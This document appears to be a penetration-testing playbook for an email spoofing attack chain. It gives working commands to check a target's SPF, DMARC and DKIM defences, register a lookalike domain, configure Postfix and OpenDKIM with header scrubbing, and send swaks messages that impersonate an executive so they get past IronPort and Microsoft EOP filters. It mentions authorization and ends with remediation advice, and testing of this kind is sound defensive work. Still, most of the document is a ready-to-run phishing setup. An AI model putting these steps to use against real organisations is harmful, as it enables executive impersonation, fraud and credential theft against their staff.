# Email Spoofing Attack Chain

**Techniques:** DNS Recon → Typosquat Domain → DKIM Infrastructure → Display Name Spoof → Header Scrubbing  
**MITRE:** T1596.005 → T1583.001 → T1587.003 / T1583.004 → T1566 / T1036.005 / T1656 → T1027  
**Auth Required:** No  
**Tags:** #playbook #email #spoofing #phishing #initial-access

---

## Objective
Deliver a spoofed email impersonating a target organization executive into a recipient's inbox, bypassing enterprise email security controls (IronPort, Microsoft EOP, Anti_Spoof filters).

---

## Prerequisites
- A domain registrar account (Cloudflare Registrar / Namecheap)
- Kali Linux (VM or bare metal) with internet access on port 25
- Postfix + OpenDKIM + swaks installed
- Written authorization / scope document for the engagement
- Target domain OSINT completed (identify executive names, email format)

---

## Step 1 — Recon: Assess Target Email Security Posture

*Technique: [[ttps/recon/email-security-dns-recon]] (T1596.005)*

```bash
DOMAIN="targetdomain.com"
echo "=== MX ===" && dig +short MX $DOMAIN
echo "=== SPF ===" && dig +short TXT $DOMAIN | grep -i spf
echo "=== DMARC ===" && dig +short TXT _dmarc.$DOMAIN
echo "=== DKIM ===" && for sel in default google selector1 selector2 k1 mail; do
  result=$(dig +short TXT ${sel}._domainkey.$DOMAIN 2>/dev/null)
  [ -n "$result" ] && echo "  [$sel]: $result"
done
```

**Decision gate:**

| Finding | Path |
|---|---|
| DMARC `p=reject` | Display name spoof only |
| DMARC `p=none` | Attempt header-from spoof; fall back to display name |
| MX is `*.iphmx.com` (IronPort) + `include:spf.protection.outlook.com` in SPF | Two-layer stack: IronPort gateway + M365 EOP internally |
| MX is `*.pphosted.com` or `*.mimecast.com` | Stricter — display name spoof only, VPS sending IP recommended |

---

## Step 2 — Check Port 25 Reachability to Target MX

```bash
MX=$(dig +short MX $DOMAIN | sort -n | head -1 | awk '{print $2}')
nc -zv $MX 25 2>&1
```

If port 25 is blocked from your sending IP → switch to non-AWS VPS or home lab.

---

## Step 3 — Check Sending IP Reputation

```bash
IP=$(curl -s https://api.ipify.org)
REV=$(echo $IP | awk -F. '{print $4"."$3"."$2"."$1}')
echo -n "Spamhaus: "; dig +short $REV.zen.spamhaus.org
echo -n "PTR: "; dig +short -x $IP
```

> If using a VPN: test with VPN on AND off. Some VPN exit nodes are blocked by Talos/IronPort even if clean on Spamhaus. Residential IPs often pass Talos but fail Gmail.

---

## Step 4 — Register Typosquat Domain

*Technique: [[ttps/resource-development/typosquat-domain-acquisition]] (T1583.001)*

Choose a domain visually similar to the target. **Critical:** Avoid Microsoft product strings (`m365`, `outlook`, `azure`) if target runs M365 — EOP brand protection will quarantine regardless of authentication scores.

Good pattern: `[target]-portal.com` or single character substitution.

---

## Step 5 — Generate DKIM Keypair

*Technique: [[ttps/resource-development/dkim-infrastructure-setup]] (T1587.003)*

```bash
mkdir -p ~/dkim && cd ~/dkim
openssl genrsa -out dkim-private.key 2048
openssl rsa -in dkim-private.key -pubout -out dkim-public.key
grep -v "^-----" dkim-public.key | tr -d '\n'   # → paste into DNS
```

---

## Step 6 — Configure DNS (Cloudflare)

Add all records to the typosquat domain. Wait 60 seconds, verify propagation:

```bash
D="your-typosquat.com"
dig @8.8.8.8 +short TXT $D              # SPF
dig @1.1.1.1 +short TXT mail._domainkey.$D   # DKIM
dig +short A mail.$D                    # A record
dig +short MX $D                        # MX
```

All four must resolve before proceeding.

---

## Step 7 — Stand Up Postfix + OpenDKIM

*Technique: [[ttps/resource-development/dkim-infrastructure-setup]] + [[ttps/defense-evasion/smtp-header-scrubbing]]*

```bash
sudo apt install postfix opendkim opendkim-tools swaks -y

# OpenDKIM — key setup + config
sudo mkdir -p /etc/opendkim/keys/your-typosquat.com
sudo cp ~/dkim/dkim-private.key /etc/opendkim/keys/your-typosquat.com/mail.private
sudo chown -R opendkim:opendkim /etc/opendkim
sudo chmod 600 /etc/opendkim/keys/your-typosquat.com/mail.private

sudo tee /etc/opendkim.conf > /dev/null << 'EOF'
Mode                sv
Selector            mail
Socket              inet:12301@localhost
RequireSafeKeys     no
Canonicalization    relaxed/simple
SigningTable        refile:/etc/opendkim/signing.table
KeyTable            /etc/opendkim/key.table
EOF

echo "*    your-typosquat.com" | sudo tee /etc/opendkim/signing.table
echo "your-typosquat.com    your-typosquat.com:mail:/etc/opendkim/keys/your-typosquat.com/mail.private" | sudo tee /etc/opendkim/key.table

# Systemd fix (Kali/Debian)
sudo mkdir -p /run/opendkim && sudo chown opendkim:opendkim /run/opendkim
sudo mkdir -p /etc/systemd/system/opendkim.service.d
sudo tee /etc/systemd/system/opendkim.service.d/override.conf > /dev/null << 'EOF'
[Service]
Type=simple
PIDFile=
ExecStart=
ExecStart=/usr/sbin/opendkim -f -x /etc/opendkim.conf
EOF
sudo systemctl daemon-reload
sudo rm -f /run/opendkim/opendkim.sock
sudo systemctl start opendkim

# Postfix — hostname + milter + header scrubbing
sudo postconf -e "myhostname = mail.your-typosquat.com"
sudo postconf -e "mydomain = your-typosquat.com"
sudo postconf -e "smtp_helo_name = mail.your-typosquat.com"
sudo postconf -e "smtpd_milters = inet:localhost:12301"
sudo postconf -e "non_smtpd_milters = inet:localhost:12301"
sudo postconf -e "milter_protocol = 6"
sudo postconf -e "milter_default_action = accept"
sudo postconf -e "header_checks = regexp:/etc/postfix/header_checks"

sudo tee /etc/postfix/header_checks > /dev/null << 'EOF'
/^Received: from.*localhost/    IGNORE
/^X-Mailer:/                    IGNORE
/^Message-Id:.*localdomain/     IGNORE
EOF

sudo systemctl restart postfix
```

---

## Step 8 — Verify Stack (Test Send)

Send to mail-tester.com or a mailbox you control (not Gmail — residential IP will hard-bounce):

```bash
swaks -4 \
  --to <mail-tester-address or your own mailbox> \
  --from support@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: Test <support@your-typosquat.com>" \
  --header "Subject: Stack Verification" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "DKIM verification test"
```

**Must confirm before proceeding:**
- [ ] `SPF: PASS`
- [ ] `DKIM: PASS` + `DKIM-Signature:` header present
- [ ] No `kali`, `localhost`, or `localdomain` in headers
- [ ] HELO shows `mail.your-typosquat.com`
- [ ] No `X-Mailer: swaks`

---

## Step 9 — Attempt Header-From Spoof (If DMARC p=none)

*Technique: [[ttps/initial-access/email-display-name-spoofing]] — Approach 2*

```bash
swaks -4 \
  --to target@victim.com \
  --from bounce@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: Executive Name <executive@victim.com>" \
  --header "Reply-To: executive@victim.com" \
  --header "Subject: Quick approval needed" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "Body text"
```

**If quarantined:** Proceed to Step 10. Document the quarantine — it's a valid finding (defense working).  
**If delivered:** Capture headers + screenshot. Finding: DMARC `p=none` policy allows header-from spoofing.

---

## Step 10 — Display Name Spoof

*Technique: [[ttps/initial-access/email-display-name-spoofing]] — Approach 1*

```bash
swaks -4 \
  --to target@victim.com \
  --from executive@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: Executive Name, Title <executive@your-typosquat.com>" \
  --header "Reply-To: executive@your-typosquat.com" \
  --header "Subject: Quick approval needed" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "Body text"
```

No domain mismatch — passes Anti_Spoof filters. Victim sees only the display name on mobile and most desktop clients.

---

## Expected Results & Report Findings

| Test | Expected Outcome | Finding |
|---|---|---|
| Header-From spoof | Quarantined by Anti_Spoof filter | ✅ Detection working — but DMARC `p=none` means no hard block |
| Display name spoof | Delivered to inbox | ❌ Gap — domain spoofing controls don't cover display name impersonation |
| Both combined | Shows detection + bypass side by side | Strong finding — demonstrates partial controls with exploitable gap |

---

## Evidence to Capture
- [ ] Header-From spoof quarantine alert (screenshot — shows IronPort/EOP detecting the attempt)
- [ ] Display name spoof inbox delivery (screenshot — shows bypass)
- [ ] Raw headers of delivered mail (shows SPF/DKIM pass, clean headers)
- [ ] `From:` display in mobile client (shows only "Executive Name" — no address)

---

## Cleanup
1. Remove DNS records from typosquat domain in Cloudflare
2. `sudo systemctl stop opendkim postfix`
3. `sudo rm -rf /etc/opendkim/keys/ ~/dkim/`
4. Document engagement artifacts and destroy if VPS used

---

## Remediation for Report

| Finding | Recommendation |
|---|---|
| DMARC `p=none` | Escalate to `p=quarantine` then `p=reject` after monitoring period |
| Display name spoof delivered | Enable strict anti-impersonation in EOP/IronPort — block external mail using internal display names |
| DKIM not configured | Implement DKIM signing on all outbound mail |
| No user awareness | Train users to verify sender address, not just display name |

---

## Related
- [[ttps/recon/email-security-dns-recon]]
- [[ttps/resource-development/typosquat-domain-acquisition]]
- [[ttps/resource-development/dkim-infrastructure-setup]]
- [[ttps/initial-access/email-display-name-spoofing]]
- [[ttps/defense-evasion/smtp-header-scrubbing]]
